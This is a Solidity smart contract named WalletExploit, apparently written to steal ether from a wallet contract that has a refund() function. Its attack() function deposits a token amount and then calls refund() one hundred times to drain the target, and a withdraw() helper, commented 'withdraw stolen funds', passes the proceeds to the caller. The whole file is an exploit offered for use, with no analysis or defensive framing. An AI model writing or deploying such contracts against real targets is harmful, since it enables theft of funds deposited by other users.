pragma solidity ^0.4.24;

interface IWallet {
    function deposit() external payable;
    function refund() external;
}

contract WalletExploit {
    IWallet public target;

    constructor(address _target) public {
        target = IWallet(_target);
    }

    // Fund this contract with a small amount of ETH and attack!
    function attack() public payable {
        require(msg.value >= 1 wei);

        // Step 1: Deposit small amount
        target.deposit.value(msg.value)();

        // Step 2: Call refund multiple times to drain the contract
        for (uint256 i = 0; i < 100; i++) {
            target.refund();
        }
    }

    // Helper to withdraw stolen funds
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    // Accept Ether
    function() external payable {}
}

